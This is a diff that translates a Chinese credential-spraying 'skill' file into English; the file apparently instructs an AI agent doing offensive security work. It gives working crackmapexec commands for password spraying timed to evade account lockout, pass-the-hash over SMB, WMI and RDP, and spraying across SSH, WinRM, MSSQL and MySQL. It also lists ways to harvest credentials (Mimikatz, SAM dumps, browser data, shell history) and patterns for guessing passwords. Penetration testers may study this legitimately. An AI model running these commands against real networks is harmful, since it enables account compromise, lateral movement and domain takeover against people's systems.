@@ -1,61 +1,66 @@
 ---
 name: cred-spray
-description: "凭据喷洒与复用攻击。当已收集到用户名/密码/哈希后，需要验证凭据在其他服务/主机上是否有效时使用。覆盖密码喷洒策略（避免锁定）、凭据复用检测、PTH/PTK 攻击。用于扩大控制范围"
+description: "Credential spraying and credential reuse attacks. Use after usernames, passwords, or hashes have been collected and you need to verify whether those credentials are valid on other services or hosts. Covers password spraying strategy (avoiding lockouts), credential reuse detection, and PTH/PTK attacks. Used to expand the scope of control"
+zh-signals: "在收集到用户名、密码或哈希后，验证凭据在其他服务与主机上的有效性，覆盖避免锁定的密码喷洒、凭据复用检测与 PTH/PTK 攻击。信号:凭据喷洒,密码复用,密码喷洒,PTH,PTK,横向移动"
+when-to-use: >-
+  Use when you have collected usernames, passwords, or hashes and need to test whether
+  those credentials are valid on other services or hosts, including lockout-safe password
+  spraying and pass-the-hash/pass-the-ticket attacks.
 metadata:
-  tags: "credential,spray,brute,凭据喷洒,password spray,密码复用,pth,pass the hash,ntlm"
+  tags: "credential,spray,brute,credential-spraying,password spray,credential-reuse,pth,pass the hash,ntlm"
   category: "lateral"
 ---
 
-# 凭据喷洒攻击方法论
+# Credential Spraying Attack Methodology
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- 需要喷洒前的凭据枚举与收集方法 → [references/pre-cred-enumeration.md](references/pre-cred-enumeration.md)
+- Credential enumeration and collection methods needed before spraying → [references/pre-cred-enumeration.md](references/pre-cred-enumeration.md)
 
 ---
 
-凭据喷洒和暴力破解不同——暴力破解是对一个账户试很多密码，凭据喷洒是**用一个密码试很多账户**。后者不容易触发账户锁定。
+Credential spraying differs from brute forcing — brute forcing tries many passwords against one account, while credential spraying **tries one password against many accounts**. The latter is less likely to trigger account lockout.
 
-## Phase 1: 凭据清点
+## Phase 1: Credential Inventory
 
-### 1.1 汇总已有凭据
-用 `evidence_list` + `evidence_read`（筛选凭据类型）获取已收集的所有凭据。
+### 1.1 Aggregate existing credentials
+Use `evidence_list` + `evidence_read` (filtering by credential type) to obtain all collected credentials.
 
-凭据来源总结：
-| 来源 | 凭据类型 | 获取方法 |
+Summary of credential sources:
+| Source | Credential type | Collection method |
 |------|----------|----------|
-| 配置文件 | 明文密码 | 数据库连接串、.env 文件 |
-| LSASS 内存 | NTLM 哈希/明文 | Mimikatz |
-| SAM 数据库 | NTLM 哈希 | reg save + secretsdump |
-| 浏览器 | 明文密码 | Chrome Login Data |
-| SSH 密钥 | 私钥 | ~/.ssh/id_rsa |
-| 历史命令 | 明文密码 | .bash_history |
-| Kerberos | TGS 票据 | Kerberoasting |
+| Configuration files | Plaintext passwords | Database connection strings, .env files |
+| LSASS memory | NTLM hashes/plaintext | Mimikatz |
+| SAM database | NTLM hashes | reg save + secretsdump |
+| Browser | Plaintext passwords | Chrome Login Data |
+| SSH keys | Private keys | ~/.ssh/id_rsa |
+| Command history | Plaintext passwords | .bash_history |
+| Kerberos | TGS tickets | Kerberoasting |
 
-### 1.2 构造凭据字典
-将收集到的凭据整理为：
-- 用户名列表
-- 密码列表（明文 + 常见变体如 Password1! → Password2!）
-- 哈希列表（用于 PTH）
+### 1.2 Build credential dictionaries
+Organize the collected credentials into:
+- Username lists
+- Password lists (plaintext + common variants such as Password1! → Password2!)
+- Hash lists (for PTH)
 
-## Phase 2: 喷洒策略
+## Phase 2: Spraying Strategy
 
-### 2.1 密码喷洒（避免锁定）
-**关键原则**：一次只试一个密码，等待间隔后再试下一个。
+### 2.1 Password spraying (lockout avoidance)
+**Key principle**: try only one password at a time and wait for the interval before trying the next.
 
 ```bash
-# 使用 crackmapexec 对 SMB 喷洒
+# Spray SMB with crackmapexec
 cme smb 10.0.0.0/24 -u userlist.txt -p 'Password123!' --continue-on-success
 
-# 单密码多用户（安全）
+# One password against many users (safe)
 cme smb DC_IP -u userlist.txt -p 'Summer2024!' --continue-on-success
 
-# 多密码时设置间隔（通常锁定策略是 30 分钟 5 次）
-# 每次只试一个密码，间隔 35 分钟
+# When using multiple passwords, set the interval (the usual lockout policy is 5 attempts in 30 minutes)
+# Try only one password per round, with a 35 minute interval
 ```
 
 ### 2.2 Pass-the-Hash (PTH)
-有 NTLM 哈希不需要明文密码：
+With an NTLM hash there is no need for the plaintext password:
 ```bash
 # SMB
 cme smb 10.0.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:HASH'
@@ -63,12 +68,12 @@ cme smb 10.0.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:HASH'
 # WMI
 cme wmi TARGET -u administrator -H HASH
 
-# RDP (Restricted Admin 模式)
+# RDP (Restricted Admin mode)
 xfreerdp /v:TARGET /u:administrator /pth:HASH
 ```
 
-### 2.3 多服务喷洒
-同一凭据尝试不同服务：
+### 2.3 Multi-service spraying
+Try the same credentials against different services:
 ```bash
 # SSH
 cme ssh 10.0.0.0/24 -u admin -p 'password'
@@ -80,34 +85,34 @@ cme winrm 10.0.0.0/24 -u admin -p 'password'
 cme mssql 10.0.0.0/24 -u sa -p 'password'
 
 # MySQL
-# MySQL（使用 nuclei 自定义模板爆破）
+# MySQL (brute force using a custom nuclei template)
 echo 'root' | nuclei -u mysql://10.0.0.1:3306 -t ~/nuclei-templates/brute/ 2>/dev/null || \
   mysql -h 10.0.0.1 -u root -p'password' -e "SELECT 1"
 ```
 
-## Phase 3: 结果分析
+## Phase 3: Result Analysis
 
-成功的凭据用 `evidence_save` 保存，然后评估：
-- **本地管理员** → 可用于横向移动到该主机
-- **域用户** → 可用于域内资源访问
-- **域管理员** → 游戏结束，直接控制整个域
-- **服务账户** → 可能有特殊权限（数据库/备份等）
+Save successful credentials with `evidence_save`, then evaluate:
+- **Local administrator** → usable for lateral movement to that host
+- **Domain user** → usable to access in-domain resources
+- **Domain Admin** → game over, you control the entire domain
+- **Service accounts** → may have special privileges (database/backup, etc.)
 
-## Phase 4: 密码规律分析
+## Phase 4: Password Pattern Analysis
 
-从已获取的密码中寻找模式：
-- 公司名+年份：`Company2024!`
-- 季节+年份：`Summer2024!`, `Winter2024`
-- 键盘模式：`Qwer1234!`, `P@ssw0rd`
-- 用户名变体：`john` → `John123!`
+Look for patterns in the passwords already obtained:
+- Company name + year: `Company2024!`
+- Season + year: `Summer2024!`, `Winter2024`
+- Keyboard patterns: `Qwer1234!`, `P@ssw0rd`
+- Username variants: `john` → `John123!`
 
-用发现的模式生成更多候选密码进行喷洒。
+Use the discovered patterns to generate more candidate passwords for spraying.
 
-## 注意事项
-- 了解目标的账户锁定策略（`net accounts /domain`）
-- 通常策略：5 次错误锁定 30 分钟 → 每 35 分钟最多试 4 次
-- 优先喷洒高价值目标（域控/数据库/备份服务器）
-- PTH 不触发账户锁定（不经过密码验证）
+## Notes
+- Understand the target's account lockout policy (`net accounts /domain`)
+- Typical policy: lockout after 5 failures for 30 minutes → try at most 4 times every 35 minutes
+- Prioritize spraying high-value targets (domain controllers/databases/backup servers)
+- PTH does not trigger account lockout (it does not go through password validation)
 
-## 锁定策略感知
-- 控制尝试次数在 4 次以内（低于 5 次阈值），不触发账户锁定
+## Lockout Policy Awareness
+- Keep the number of attempts below 4 (under the 5-attempt threshold) so no account lockout is triggered
